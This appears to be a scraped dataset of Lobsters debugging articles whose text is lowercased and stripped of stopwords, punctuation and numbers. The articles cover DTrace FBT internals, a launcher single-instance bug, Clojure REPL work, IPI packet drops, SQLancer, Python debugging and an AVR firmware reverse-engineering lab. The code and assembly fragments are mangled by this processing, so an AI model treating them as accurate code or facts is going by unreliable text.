58,Lobsters,debugging,Debugging,Tracing Kernel Functions: How the illumos AMD64 FBT Provider Intercepts Function Calls,https://zinascii.com/2020/the-amd64-fbt-handler.html,tracing kernel function illumos fbt provider intercept function call,tracing kernel function illumos fbt provider intercept function call dynamic instrumentation production system insrtumenting function call return handler threadinterrupt state prehandler invoptrap handler usrsrcutsinteldtracefbtc usrsrcutsinteldtracefbtc locores trap usrsrcutsinteldtracefbtc,tracing kernel function illumos fbt provider intercept function call june money perhaps nothing valuable situ kernel debugging ability ask question part kernel live production system without stopping pausing anything feel like right privilege experienced first hand one avenue situ kernel debugging dtrace fbt provider fbt provider stand function boundary tracing allows one trace kernel function entry return site argument return value even grab stack lead call overhead probe disabled minimal overhead specific entry return site enabled dtrace made several part command user library kernel framework vm provider interface author made smart decision separating general infrastructure dtrace specific probe creation firing provider provide fire probe point framework executes action allows provider developed separately dtrace want learn dtrace recommend reading dynamic instrumentation production system presented usenix post want focus fbt intercept function call user enables fbt probe exactly probe end firing kernel thread hit entry return site example following oneliner instrument call macringtx function responsible delivering network packet underlying nic count number packet traveling across interface along distribution packet size sent across interface see simple function entry probe quite powerful touching surface possible exactly fbt provider accomplish rpz thunderhead pfexec dtrace qn macringtx entry mip macimplt mip miname count dist mip miname quantize msgsize args end printf total packetsn printa printf ndistributionn printa dist c total packet distribution value distribution count value distribution count value distribution count value distribution count value distribution count value distribution count value distribution count packet distribution per interface insrtumenting function call return describe site intercepted need give primer kernel text instrumented upon first use dtrace load fbt provider iterates loaded kernel module pass one fbtprovidemodule function us elf section header data iterate function read program text find location entry return site fbt provider creates fbt probe fbtprobet site responsible holding information needed instrument site design produce zero overhead probe use program text modified stage user executes script containing one fbt probe provider instrument kernel module text dtrace framework call fbtenable passing fbt probe structure created earlier contains information needed alter correct program text entry probe fbt replaces push rbp instruction otherwise return probe fbt replaces ret instruction case fbt replaces instruction breakpoint instruction bp intel mnemonic design produce minimal overhead needed intercept probe site modifies site requested leaving text untouched breakpoint known software exception processor exception produced request software opposed exception generated legit program exception like divide zero exception really interrupt small difference interrupt something typically generated external processor whereas exception generated processor consequence code executing furthermore reading code also see breakpoint referred trap yet classification exception dictate action processor take upon servicing exception three term used interchangeably throughout code important thing remember interrupt interrupting normal flow program code case kernel like interrupt operating system must provide processor action take upon receiving breakpoint action defined interrupt descriptor table idt seen setgatesegd idt tbptflt kptienable trbrktrap brktrap kcssel sdtsysigt trpupl idtvectortoist tbptflt breakpoint idt entry upon receiving breakpoint processor call handler trbrktrap tr prefix stand trampoline mitigation method used part kpti trampoline provides meltdown protection ultimately lead brktrap come back later sdtsysigt argument tell u interrupt gate meaning processor disable assertion maskable hardware interrupt invoking handler preventing another interrupt interrupting breakpoint trpupl argument indicates interrupt may originate user kernel space case fbt provider always originate kernel space finally last argument index interrupt stack table ist collection dedicated stack used interrupt handling avoid scribbling interrupted thread stack case tbptflt handler map dedicated stack handler running script contains action one fbt probe kernel thread executes one probe site next based idt entry call brktrap handler quite happens first processor work operating system behalf calling interrupt handler must switch stack specified idt entry push following value order see intel vol interrupted thread stack selector s interrupted thread stack pointer rsp interrupted thread rflags interrupted thread code segment selector c interrupted thread instruction pointer rip error code exception error code apply end processor interrupt context interrupted thread primary cpu context loaded new stack ready execute operating system brktrap handler depicted figure threadinterrupt state prehandler threadinterrupt state prehandler invoptrap handler brktrap handler actually front real workhorse invoptrap handler different provider use different method trapping dtrace framework use bp others use lock prefix incorrectly order force invalid operation fault ud sure method exist provider prefer one method perhaps fodder future post case fbt first stop brktrap bp entrynp brktrap xpvtrappop cmpw kcssel rsp jne bpuser breakpoint kernel likely dtraceinduced unify dtrace handling spoof invalid opcode ud fault note bp trap fault must decrement trapping rip make appear fault push nonzero error code indicate coming bp decq rsp push error code nonzero bp jmp udkernel breakpoint handler line determine bp originated userland kernelland former jump bpuser otherwise fall familiar assembly break line bit point instruction interrupt rsp point word containing rip interrupted thread rsp instruction syntax indirect memory addressing tell cpu read value rsp basically parens equivalent dereferencing pointer c since stack grows downward every value stack adding byte reference value rsp stack interrupted thread c therefore cmpw instruction compare lower bit immediate value kcssel interrupted thread c value case know bp originated kernel thread processor fall line well described comment bulk handling done ud handler fbt case coming via bp rather replicate handler logic opt make bp look like ud jumping udkernel handler achieved rolling back rip one instruction would case ud fault pushing error code stack error code meaningless case needed keep stack layout consistent exception exception share common routine expect stack laid particular way entrynp invoptrap xpvtrappop cmpw kcssel rsp jne uduser defined xpv movb rsp clear saved upcallmask c endif push error code zero ud udkernel push dummy trap number ud handler line find udkernel label sits instruction invoptrap handler main dtrace entry point like brktrap handler invoptrap look interrupt origin determine since originated bp skip head straight line push dummy trap number like dummy error code pushed brktrap done make sure stack consistent layout across exception macro like intrpush function correctly however push dummy value instead actual trap number like trap mystery ud handler mentioned exception use stack layout exactly layout layout defined regs structure shown structure includes value pushed processor exception mechanism well trap number generalpurpose register segment register two special value named rsavfp rsavpc last two field contain copy interrupted thread frame pointer program counter respectively processor exception mechanism populates line structure stack line populated handler intrpush responsible populating rest struct regs extra frame mdb follow high level interrupt system trap set terminate stacktrace gregt rsavfp copy rbp gregt rsavpc copy rip gregt rrdi arg function gregt rrsi arg function gregt rrdx arg function return register gregt rrcx arg function gregt arg function gregt arg function gregt rrax return register sse register gregt rrbx calleesaved optional base pointer gregt rrbp calleesaved optional frame pointer gregt temporary register static chain pointer gregt temporary register gregt calleesaved gregt calleesaved gregt calleesaved gregt calleesaved fsbase gsbase sampled every exception debug kernel remain nondebug kernel avoid flag day gregt rfsbase longer used nondebug build gregt rgsbase longer used nondebug build gregt rds gregt re gregt rf f never used kernel gregt rg gregt rtrapno rest defined hardware gregt rerr gregt rrip gregt rcs gregt rrfl gregt rrsp gregt r regs structure shared across exception handler intrpush entire regs structure populated stack rsp pointing rsavfp movq regoffrip rsp rdi movq regoffrsp rsp rsi movq regoffrax rsp rdx pushq rsi movq rsp rsi subq rsp call dtraceinvop altentry dtraceinvopcallsite ud handler line ready first third argument dtraceinvop call address instruction intercepted rax value function interrupted return probe line look like placing interrupted thread stack pointer second argument position really staging pointer rsi line line dereference rsp interrupted thread place value top handler stack lead question last thing pushed stack interrupted thread depends probe entry probe instrument pushq rbp instruction thus last thing stack return site function called interrupted function foo called bar bar entry point instrumented dtrace rsi would foo turn true return probe well illumos us leave plus ret exit function fbt instrument ret instruction therefore upon entry invop handler last thing interrupted thread stack always return instruction pointer moving onto line replace interrupted thread stack pointer handler stack pointer dtraceinvop pointer handler stack second argument finally calling dtraceinvop subtract byte stack keep alignment see intel vol generic dtraceinvop function check instrumentation point sdt fbt provider case dealing fbt probe end calling fbtinvop moving also worth noting line call dtraceinvop create symbol dtraceinvopcallsite becomes return address upon entering dtraceinvop use becomes important accessing function argument cover follow post usrsrcutsinteldtracefbtc static int fbtinvop uintptrt addr uintptrt stack uintptrt rval uintptrt fbtprobet fbt fbtprobetab addr fbt null fbt fbt fbtphashnext fbt invop handler fbt probe stored chained hash table named fbtprobetab line hash instrumented address determine bucket probe line loop entry bucket find one matching address usrsrcutsinteldtracefbtc uintptrt fbt fbtppatchpoint addr fbt fbtproffset int accessing argument stack must protect accessing beyond stack safely set nofault know interrupt already disabled dtracecpuflagset cpudtracenofault cpu cpudtracecaller stack ifdef stack contains dereferenced stack pointer stack contains savfp stack contains savpc want step entry endif stack stack stack stack stack dtracecpuflagclear cpudtracenofault cpudtracebadaddr dtraceprobe fbt fbtpid cpu cpudtracecaller fbt entry probe case found entry probe matching instrumented address know entry probe fbtproffset zero use cpudtracenofault interesting honest sure fully understand used best guess first nofault mechanism used throughout dtrace protect operating system bad load dtrace action flag allows page fault logic locores determine pf originated dtrace skip offending instruction set dtrace cpu flag indicate faulting load move execution different typical pf would wind global trap handler use think directly accessing handler stack via stack pointer opposed typical way access stack c using local variable read always valid perhaps always case history code event reference line happen go bound pf handler catch simply move leaving whatever garbage value initialized time start reading data handler stack remember stack pointing handler stack point last push invoptrap handler last thing saved stack caller instrumented function found location stack line store symbol address cpulocal variable cpudtracecaller used dtrace stack action populate dtrace builtin caller variable next two value handler stack regs structure value rsavfp rsavpc saved value frame pointer program counter respectively skip get argument instrumented function system v abi dictate first six argument stored specific register stack n access reference register variable passed dtraceprobe act cache first five argument instrumented function five six illumos longer support kernel support ud handler setup stack point beginning first argument instrumented function know also seem sparc limitation quick search various sparc abis claim first six argument may placed register best guess desire keep argument dtraceprobe register efficiency perhaps avoid polluting stack probe action sensitive stack depth stack action event final action call dtraceprobe main entry point dtrace framework ultimately executes action linked dtrace probe usrsrcutsinteldtracefbtc else ifdef instrument ret leave therefore need set caller assure top frame stack action correct dtracecpuflagset cpudtracenofault cpu cpudtracecaller stack dtracecpuflagclear cpudtracenofault cpudtracebadaddr endif dtraceprobe fbt fbtpid fbt fbtproffset rval cpu cpudtracecaller return fbt fbtprval return fbt return probe case matching return probe sure follow comment caller return address still interrupted thread stack regardless whether instrument leave ret instruction point value must saved case user call dtrace action stack action like entry probe goal send probe event dtrace framework time instead passing argument pas return offset return value value accessible fbt return probe action variable respectively case matching probe need return fbtprval value line value determined probe creation time tell invoptrap handler return back interrupted thread value depends type probe entry v return architecture v given illumos longer ship kernel ignore architecture assume mean return dtraceinvoppushlebp entry probe dtraceinvopret return probe find matching probe return zero line tell invop handler treat fault normal ud continue processing pushq rsi movq rsp rsi subq rsp call dtraceinvop altentry dtraceinvopcallsite addq rsp cmpl dtraceinvoppushlebp eax je udpush cmpl dtraceinvopleave eax je udleave cmpl dtraceinvopnop eax je udnop cmpl dtraceinvopret eax je udret jmp udtrap ud handler picking line invoptrap handler add byte stack pointer undoes push line leaving rsp start regs structure jump one label depending value returned fbtinvop udpush must emulate pushq rbp pull stack byte store base pointer intrpop subq rsp make room rbp pushq rax push temp movq rsp rax load calling rip addq rax increment trapping instr movq rax rsp store calling rip movq rsp rax load calling c movq rax rsp store calling c movq rsp rax load calling rflags movq rax rsp store calling rflags movq rsp rax load calling rsp subq rax make room rbp movq rax rsp store calling rsp movq rsp rax load calling s movq rax rsp store calling s movq rsp rax reload calling rsp movq rbp rax store rbp popq rax pop temp jmp triretkernel return interrupt ud handler case leaving entry probe need emulate pushq rbp instruction overwritten breakpoint first line intrpop restores gprs adjusts rsp point value pushed processor switching interrupt stack namely c rip rflags s rsp value interrupted thread rest code starting line bit odd even conflict comment somewhat pulling stack byte code need way think way consequence time past interrupt handler using stack perhaps author routine started copy routine idea iret call going pop value stack restore c rip rflags s rsp register original value order emulate frame pointer push need pull stack enough byte store said pointer first need shift value originally stashed processor stack interrupt taken made sense handler reused kernel thread stack need pull handler stack unnecessary said handler still pull stack real effect also modifies interrupted thread referred caller code rsp stash rbp increment interrupted thread rip next instruction finally jump triretkernel really iret instruction author kpti decided would wise alias future maintainer know iret path analyzed working meltdown mitigation blessing maintain code decade come iret executed back kernel thread original execution context fbt never involved push emulation could written simpler manner simpleudpush emulate pushq rbp stashing rbp caller stack incrementing caller rip one intrpop pushq rax stash rax use scratch movq rsp rax load calling rip addq rax increment trapping instr movq rax rsp store calling rip movq rsp rax load calling rsp subq rax make room rbp movq rbp rax store rbp movq rax rsp store calling rsp popq rax restore rax jmp triretkernel return interrupt simpler push emulation udret intrpop pushq rax push temp movq rsp rax load rsp movq rax rax load calling rip movq rax rsp store calling rip addq rsp adjust new rsp popq rax pop temp jmp triretkernel return interrupt ud handler emulate ret instruction line push rax stack order use scratch register line use interrupted thread rsp get return pointer line replace stashed rip handler stack one pulled interrupted thread stack remember iret going populate rip handler stack line remove stored rip interrupted thread stack line restore rax finally iret back interrupted thread know kernel function entryreturn point instrumented intercepted emulated interesting part fbt story one powerful aspect dtrace ability grab stacktrace argument time probe firing feature implemented function rely invop handler help understand handler see dtrace feature work described follow post
59,Lobsters,debugging,Debugging,Coding a Single Instance Application the wrong way,https://cookieplmonster.github.io/2020/06/13/single-instance-application-the-wrong-way/,coding single instance application wrong way,kao mystery volcano free steam announced pcgamingwiki article debugging issue ribshark hassle block optimal proper attempt wait timeout attempt check sending message first attempt customer really wanted application named kernel object erroralreadyexists silentpatch,today looking niche polish game kao mystery volcano third installment kao series since kao kangaroo round currently free steam new kao game announced think great time check game first time got hand game sadly steam installed tried open launcherexe nothing game require launcher run fine impossible configure graphic setting within game therefore launcher mandatory welcome addition surprisingly pcgamingwiki article kao mention issue debug course debugging issue jumping debugger took advice ribshark inspected process closely task manager course us cpu time memory stay constant low value hint process stuck something may able find stuck using analyze wait chain little dialog show process waiting another process process waiting sure enough launcher waiting nvcontainerexe issue one specific process however also seen waiting devenvexe visual studio earlier appears bizarre reason launcher waiting random running process time peek launcher code disassembled executable good grief assembly code convoluted annoying read typical executables created delphi quick peek binary cff explorer confirms theory claim launcher built borland delphi one first thing launcher perform two check must return false else process terminates first check obvious bool foo return findwindowa launcher kangurek kao tajemnica wulkanu nullptr nullptr interestingly string look like window name passed class name parameter know intended mistake wrong function one causing trouble function much interesting enumerates top level window performs action like bool bar gfoundmatchingwindow false enumwindows enumproc nullptr return gfoundmatchingwindow bool callback enumproc hwnd hwnd lparam lparam bool continueenum windowfunc hwnd continueenum gfoundmatchingwindow continueenum return continueenum bool windowfunc hwnd hwnd char classname lresult msgresult getclassnamea hwnd classname sizeof classname msgresult sendmessagea hwnd nullptr nullptr return strcmp classname tmainmenu msgresult wrong code everything elaborate code bad need understand code first place hassle given two check determine whether launcher run terminate background allow single instance launcher simple concept mean circumstance possible two launcher run first attempt succeeds next attempt result application terminating show anything user launcher application try achieve two step look window whose class name launcher kangurek kao tajemnica wulkanu expect mistake likely window name enumerates every window following get class name window sends magic knock message window correspond standard window message must defined launcher store response check correct class name correct response logic fall apart point sending message window via sendmessage block message processed target window easy envision fall apart since launcher happily broadcast message window take single window respond time code protected case process window process message time cause launcher hang waiting answer infinitely way improve code present first two optimal consider code proper solution stick around last suggestion attempt wait timeout since root cause issue waiting endlessly could add timeout consider check failed response arrive time bool windowfunc hwnd hwnd nt use char classname lresult msgresult getclassnamea hwnd classname sizeof classname lresult sendresult sendmessagetimeouta hwnd nullptr nullptr smtoblock msgresult per window way generous already sendresult getlasterror errortimeout return false timed return strcmp classname tmainmenu msgresult work work use nothing workaround root issue address attempt check sending message first windowfunc function make weird mistake easily avoided first obtains class name sends magic knock check class name response make sense neither code real life one knock magic pattern somebody door would check right house even attempting knock waiting response laid like fix trivial split check bool windowfunc hwnd hwnd char classname getclassnamea hwnd classname sizeof classname strcmp classname tmainmenu return false window want send magic knock lresult msgresult sendmessagea hwnd nullptr nullptr return msgresult resolve root cause code send message window know realistically never end scenario window respond problem solved however best solution attempt customer really wanted software engineering crucial emphasize understanding customer truly want case precise intention code code intend allow one window specific name class true intention allow single instance application even window created yet another launcher instance run proper way solve problem launcher instantiate named kernel object pick unique enough name object presence unambiguously indicates another launcher instance already running object lifetime bound process lifetime released explicitly earlier fully bulletproof solution scratch foo bar function achieve better result way le code programmer pick specific kernel object instantiate programmer commonly use mutex bool anotherinstancerunning handle mutex createmutex nullptr false text launcher kangurek kao tajemnica wulkanu unique name return mutex nullptr getlasterror erroralreadyexists deliberately leak handle want mutex lifetime process often see functionality implemented first trying open existing mutex creating one exist redundant createmutex doc state mutex named mutex object existed function call return value handle existing object getlasterror function return erroralreadyexists therefore achieve single step also remove possibility race condition process theory race condition could occur another launcher instance reached openmutex step first instance created mutex winwin silentpatch raise question silentpatch fixing right two reason launcher app lightweight link library supported ultimate asi loader would bit weird release patch launcher game right
60,Lobsters,debugging,Debugging,Conversational software development,https://oli.me.uk/conversational-software-development/,conversational software development,fizz buzz fizzbugged,let use conjure conversational software development fix issue simple clojure fizz buzz program called repository fizzbugged since slightly broken design n fizzbuggedmain require clojurestring str defn n str n let zero mod n zero mod n cond fizz buzz fizz buzz else str n defn main range map n str strjoin println contrived example demonstrate development style hard problem probably already spot issue program almost correct quite let get repl running connect conjure evaluate code clojure nreplcmdline middleware cidernreplcidermiddleware nrepl server started port host localhost nrepl open neovim conjure installed connect automatically evaluate content main placing cursor inside form pressing ee comma prefix depend maplocalleader setting conjure configuration result appear hud small window top right open log split see l expected actual output program far expected fizz buzz fizz fizz buzz fizz fizz buzz actual buzz fizz buzz buzz buzz fizz buzz buzz fizz buzz fizz buzz combination appear multiple happening odd place look like fizz buzz inverted rest time let add comment buffer test form check specific return value n str evaluated form inside comment ee see result log buffer edit interact way clearly suspicion correct fizz buzz flipped fizz buzz applying way multiple going flip value around let binding evaluate function er evaluates top level root form cursor run little adhoc test suite notice weird behaviour fizz buzz occouring thing multiple one correct reevaluate n str execute body main one last time look good bear mind extremely simple example might thinking run program made change perfectly acceptable instance conversation program really shine talking directly staging server poking state intermediate step complex pipeline take minute run end end connected run step individually caching result var allows run individual part program demand without change code go harder complex problem thankful tool close hand
61,Lobsters,debugging,Debugging,Schrödinger’s Packet Drops,https://medium.com/niometrics-tech-blog/schrodingers-packet-drops-e1556af3e228,schrödinger packet drop,schrödinger packet drop hypothetical cat ate real packet speed bump niometrics dpdk ipis setup dpdk part problem interrupt dpdk ipi crash course apic architecture local apic per cpu ipi ipi external io apic external io interrupt listing logical irq vector device listing smp affinity irq vector device local timer interrupt evolution timer interrupt interprocessor interrupt smpcallfunctioninterrupt sendipiall sendipiallbutself sendipiself sendipimaskallbutself sendipimask ipi call function single interrupt ipi nativesendcallfuncipi ipi nativesendcallfuncsingleipi tlb shootdown interrupt paging,schrödinger packet dropsor hypothetical cat ate real speed bumpsthe demand bandwidth pushing network software vendor like niometrics support network interface controller nics network probe us data plane development kit dpdk bypass linux kernel direct traffic user space eliminates overhead nic interrupt achieve high bandwidth processing rate nics however brought new challenge one issue faced interprocessor interrupt ipis causing sporadic packet drop lower bandwidth apparent congestion first part post briefly discus different type interrupt interrupt handling hardware memory management unit second part offer glimpse troubleshooting debugging fixing issue due interrupt handling multisocket systemsour setupbefore start description hardware software environment involved article hpe proliant server intel r xeon r platinum cpu memory tb reserved huge page using kernel command line argument reserve huge page per socket mellanox technology singleport en network interface cardscentos kernel critical core isolated made jitterfree almost using isolcpus nohzfull rcunocbs rcunocbpoll kernel command line parameterspart problem interruptsin network probe using dpdk packet reception handled rx thread polling mode thread constantly poll nic rx ring packet tight loop interrupt interrupt execution user space task causing context switch kernel space handle interrupt introduces jitter rare affect throughput nics cause packet drop increasing nic rx ring size number rx ring mitigate alwaysfor sake clarity divide interrupt following type external io interruptslocal timer interrupt loc interprocessor interrupt ipi describe type affect high performance system let take look hood apiccrash course apic architectureapic stand advanced programmable interrupt controller system interrupt handled local apic per cpu external io apiclocal apic per cpu per cpu local apic receives interrupt sends processor core handling interrupt come processor interrupt pin internal source external io apic external interrupt controller symmetric multiprocessing smp system local apic sends receives ipi message logical processor system bus ipi message used distribute interrupt among processor system execute systemwide function booting processor distributing work among group processor external io apicthe io apic part intel system chip set receives external interrupt event system associated io device relay local apic interrupt messagesin smp system io apic also provides mechanism distributing external interrupt local apics selected processor group processor system busexternal io interruptswe use irqbalance daemon move external interrupt handling away isolated core participating packet processing set core reserved purpose interrupt handling ensures external interrupt cause jitter task isolated core also ensures irq affinity assigned core closest numa node device irqbalancebannedcpus environment variable must set mask isolated core ensure interrupt assigned following example illustrate thislisting logical irq vector device us vector smp affinity irq vector device interrupt handled cpu core timer interruptsevolution timer interruptslocal timer interrupt loc line procinterruptsprior kernel timer tick ran every core rate confighz default tickle kernel kernel disabled kernel timer tick idle core schedulingclock interrupt used force busy core schedule multiple task idle core task schedule require schedulingclock interruptthe nohzfull kernel command line parameter introduced kernel optimisation top tickle kernel extends tickle behaviour core one running task still need schedule tick every second process management operation like calculating core load maintaining scheduling average etcthe nohzfull option used core dedicated thread performing packet processing functionsinterprocessor interruptsinterprocessor interrupt allow cpu send interrupt signal cpu system defined buildinterrupt macro smp kernel smp prepended function name eg buildinterrupt callfunctioninterrupt callfunctionvector call function interrupt vector handled smpcallfunctioninterrupt interrupt raised calling function pointed sendipiall sendipiallbutself sendipiself sendipimaskallbutself sendipimask function pointerscommon type ipi call function single interrupt cal tlb shootdown interrupt tlb call function single interruptthese accounted cal row procinterruptsthe call function interrupt ipi sent many cpu raised calling nativesendcallfuncipi call function single interrupt ipi sent one cpu time raised calling nativesendcallfuncsingleipi used perf trace kvm otherstlb shootdown interruptsthe tlb shootdown special type cal interrupt counter tlb line procinterrupts cal counter include tlb shootdownsto understand purpose tlb shootdown interrupt need briefly discus paging work used supporting paging multiprocessor systemspaging exist three kind address logical address included machine language instruction consists segment offsetlinear address virtual address single unsigned integer used address address unsigned integer used address memory cell memory chipsthe paging unit mmu memory management unit convert linear address physical address diagram illustrate linear address translation page v page
62,Lobsters,debugging,Debugging,SQLancer: Detecting Logic Bugs in DBMS,https://github.com/sqlancer/sqlancer,sqlancer detecting logic bug dbms,sqlancer getting started maven potential commercialization manuel rigger zhendong su research prototype testing approach supported dbms using sqlancer log reducing bug creduce found bug community slack workspace sqlancerdbms additional documentation additional resource youtube youtube gosqlancer,sqlancer sqlancer synthesized query lancer tool automatically test database management system dbms order find logic bug implementation refer logic bug bug cause dbms fetch incorrect result set eg omitting record sqlancer operates following two phase database generation goal phase create populated database stress dbms increase probability causing inconsistent database state could detected subsequently first random table created randomly sql statement chosen generate modify delete data also statement create index well view set dbmsspecific option sent dbms testing goal phase detect logic bug based generated database see testing approach getting started requirement java maven sudo apt install maven ubuntu dbms want test sqlite embedded dbms included following command clone sqlancer create jar start sqlancer fuzz sqlite using ternary logic query partitioning tlp git clone http githubcomsqlancersqlancer cd sqlancer mvn package dskiptests cd target java jar numthreads oracle norec execution print progress information every five second tool work expected note sqlancer might find bug sqlite reporting sure check still reproduced using latest development version shortcut ctrlc used terminate sqlancer manually sqlancer find bug executes infinitely option numtries used control many bug sqlancer terminates alternatively option timeoutseconds used specify maximum duration sqlancer allowed run launch sqlancer without parameter available option command displayed note general option supported dbmstesting implementation eg numthreads need precede name dbms tested eg option supported specific dbms eg testrtree option testing implementation provides different value eg oracle norec need go dbms name potential commercialization due significant interest received considering commercialize bugfinding effort represent company would interested bugfinding service please approach u manuel rigger zhendong su expectation requirement service research prototype project stage still seen research prototype believe tool ready used however received many request company organization individual developer decided prematurely release tool expect error incompatibility lack documentation insufficient code quality said working hard address issue enhance sqlancer become productionquality piece software welcome issue report extension request code contribution testing approach approach description pivoted query synthesis pqs pqs first technique designed implemented randomly selects row called pivot row query generated guaranteed fetch row row contained result set bug detected fully described pqs powerful technique also requires implementation effort two technique currently unmaintained nonoptimizing reference engine construction norec norec aim find optimization bug described translates query potentially optimized dbms one hardly optimization applicable compare two result set mismatch result set indicates bug dbms ternary logic partitioning tlp tlp partition query three partitioning query whose result composed compare original query result set mismatch result set indicates bug dbms contrast norec pqs detect bug advanced feature aggregate function please find bib entry supported dbms since sql dialect differ widely dbms tested requires separate implementation dbms status expression generation description sqlite working untyped implementation currently affected significant performance regression still need investigated mysql working untyped running implementation likely uncovers additional unreported bug postgresql working typed citus postgresql extension working typed implementation extends postgresql implementation sqlancer contributed citus team mariadb preliminary untyped implementation dbms preliminary since stopped extending one bug report addressed running likely uncovers additional unreported bug cockroachdb working typed tidb working untyped duckdb working untyped generic clickhouse preliminary untyped generic implementing different table engine convenient preliminary implementation exists tdengine removed untyped removed tdengine implementation since one bug report still unaddressed five month reported using sqlancer log sqlancer store log targetlogs subdirectory default option logeachselect enabled result every sql statement sent dbms logged corresponding file name postfixed curlog addition sqlancer detects logic bug creates file extension log statement reproduce bug logged reducing bug finding bug useful produce minimal test case reporting bug save dbms developer time effort many test case creduce great job addition working sqlspecific reducer plan release soon found bug would appreciate mention sqlancer report bug found would also excited know using sqlancer find bug extended test another dbms also plan contribute project sqlancer found bug widelyused dbms listed community created slack workspace discus sqlancer dbms testing general sqlancer official twitter handle sqlancerdbms additional documentation additional resource talk ternary logic partitioning tlp sqlancer available youtube older pivoted query synthesis pqs talk available youtube pingcap implemented pqs norec tlp tool called gosqlancer information dbms testing effort bug found available
63,Lobsters,debugging,Debugging,Ultimate Guide to Python Debugging,https://towardsdatascience.com/ultimate-guide-to-python-debugging-854dea731e1b,ultimate guide python debugging,ultimate guide python debugging let explore art debugging using python logging tracebacks decorator danny mc unsplash logging must doc logging cookbook logging decorator repr readable log missing dunder method dictionary debugging crashing application pdb doc inspecting stack trace reloading module debugging conclusion art debugging,ultimate guide python debugginglet explore art debugging using python logging tracebacks decorator write clear readable code even cover code test even experienced developer weird bug inevitably appear need debug way lot people resort using bunch print statement see happening code approach far ideal much better way find wrong code explore articlephoto danny mc unsplashlogging mustif write application without sort logging setup eventually come regret log application make difficult troubleshoot bug luckily python setting basic logger simple need start writing log file look something like find path file using logginggetloggerclass roothandlers basefilename setup might seem like good enough often well configured formatted readable log make life much easier one way improve expand config use ini yaml file get read logger example could config kind extensive config inside python code would hard navigate edit maintain keeping thing yaml file make much easier set tweak multiple logger specific setting like one aboveif wondering config field came documented keyword argument shown first exampleso config file mean need load somehow simplest way yaml file python logger actually support yaml file directly support dictionary configs easily created yaml using yamlsafeload inclined rather use old ini file want point using dictionary configs recommended approach new application per doc example check logging cookbooklogging decoratorscontinuing previous logging tip might get situation need log call buggy function instead modifying body said function could employ logging decorator would log every function call specific log level optional message let look decorator gon na lie one might take bit wrap head around might want copypaste use idea log function take argument make available inner wrapper function argument made adjustable adding accessor function attached decorator functoolswraps decorator nt use name function funcname would get overwritten name decorator problem want print name get solved functoolswraps copy function name docstring argument list onto decorator functionanyway output code pretty neat right repr readable logseasy improvement code make debuggable adding repr method class case familiar method return string representation instance class best practice repr method output text could used recreate instance example representing object shown desirable possible good alternative use representation using eg iotextiowrapper namesomefiletxt mode w apart repr also good idea implement str method default used print instance called method get lot information printing variablesmissing dunder method dictionariesif whatever reason need implement custom dictionary class expect bug arising keyerrors try access key nt actually exist avoid poke around code see key missing could implement special missing method called every time keyerror raisedthe implementation simple return log message missing key could also log valuable information give context went wrong codedebugging crashing applicationif application crash get chance see going might find trick quite usefulrunning application withi argument apppy cause start interactive shell soon program exit point inspect variable functionsif good enough bring bigger hammer pdb python debugger pdb quite feature would warrant article example rundown important bit let first see little crashing script run argument get chance debug debugging session show briefly could pdb program terminates enter interactive debugging session first import pdb start debugger point use pdb command example print variable using p command list code using l command time would probably want set breakpoint b lineno run program breakpoint hit c continue stepping function optionally maybe printing stacktrace w full listing command go pdb docsinspecting stack traceslet say code example flask django application running remote server get interactive debugging session case use traceback sys package get insight failing code run code print last exception raised apart printing exception also use traceback package print stacktrace tracebackprintstack extract raw stack frame format inspect tracebackformatlist tracebackextractstack reloading module debuggingsometimes might debugging experimenting function interactive shell making frequent change make cycle runningtesting modifying easier run importlibreload module avoid restart interactive session every change tip efficiency debugging always nice able skip unnecessary step make workflow faster efficient general reloading module time time good idea help avoid trying debug code already modified bunch time meantimedebugging artconclusionmost time programming really lot trial error debugging hand opinion art becoming good take time experience know library framework use easier get tip trick listed make debugging bit efficient faster apart pythonspecific tool might want familiarize general approach debugging example art debugging remy sharpif liked article check python article
64,Lobsters,debugging,Debugging,Fixing a long-standing bug in satellite-based nuclear weapon detectors,https://docs.google.com/document/d/1pyGft-OXrSw1ZPUMZCE0mxG92_xqtzgdanHwkKLpxUQ/edit,fixing longstanding bug satellitebased nuclear weapon detector,,javascript nt enabled browser file ca nt opened enable reload
66,Lobsters,debugging,Debugging,Using Z3 Theorem on AVR Firmware,https://medium.com/@ryancor/using-z3-theorem-on-avr-firmware-c6d2f45ac9c2,using theorem avr firmware,using theorem avr firmware hal satisfiability modulo theory avr architecture mcu gpios data bus general purpose register alu instruction decoder program counter flash memory sram eeprom io line usart baud rate clock lab assignment virustotal baudratepy side note emulator atmel instruction manual side note side note theorem solution satisfiability modulo theory smt side note solver,using theorem avr firmwareas many may may aware serious obsession embedded system security two year ago started journey incorporating knowledge reverse engineering software application pulling apart firmware embedded device additionally also started learning hardware security concept sidechannel attack faultinjectionsglitch attack bit flipping moreanyone began career embedded security tell arduino board best device get started pretty intricate ide abundant amount hal hardware abstraction layer api call use needle say writing first hello world application embedded system industry fairly rudimentary blinking ledthe goal paper show use formula python break weak password checker use linear inequality equality satisfiability modulo theoriesavr architectureto give background arduino us main mcu microcontroller unit help understand avr avr risc architecture reduced instruction set computing avr based microcontrollers became widely popular one first game onchip flash storage lab exercise using arduino nano board mcublock diagram architecturewhat chip operating voltage range pin programmable gpios general purpose inputoutput come standard set communication interface masterslave spi serial peripheral interface usb usart universal synchronousasynchronous receiver transmitter twowire peripheral protocol interintegrated circuit discus usbtousart depth later become important flashing chip target firmware communicating chip sending receiving datalet go diagram data bus handle data chunk travel inside microcontroller bus line widegeneral purpose register used arithmetic operation adding subtracting number setting jump pointer compare operation previous article wrote discussed register architecture case avr stand arithmetic logic unit work direct connection general purpose register arithmetic operation gpr immediate operand executed within single clock cycle divide operation three category arithmetic logical bitwise functionsinstruction decoder combinational circuit whose purpose translate instruction code address micromemoryprogram counter pc bit wide address program memory locationsas see picture three different type memory used flash memory programmable readonly memory rom firmware changed using programmer bootloader sram area volatile memory hold data electrically powered lastly eeprom electronically erasable programmable read memory semi permanent data storage accessed using special register inside avr ability control thing like address written data written flag used read dataio line used controlling application digital input output pin pin detect voltage change high low electromagnetic force digital output io pin connected diode trace vcc gnd lineio line schematicnow better understanding avr architecture let briefly go going communicate chip using usbtousartusartthe usbtousart converterbridge serial port computer responsible sending serial data two wire clock signal parleying two device communicate accurately device must configured beforehand use speed communication otherwise known baud rate baud rate simply rate information transferred communication channel serial port context baud mean serial port capable transferring maximum bit per second calculated two way 𝐷 𝑛 𝑏𝑛 𝐵 𝑏𝑛 𝑛 b defined unit total bit per second application data bit per second n bit conveyed per symbol gross bit rate r inclusive channel coding overhead symbol rate f calculated r nthe usart clock must operate time desired baud rate clock based around operation 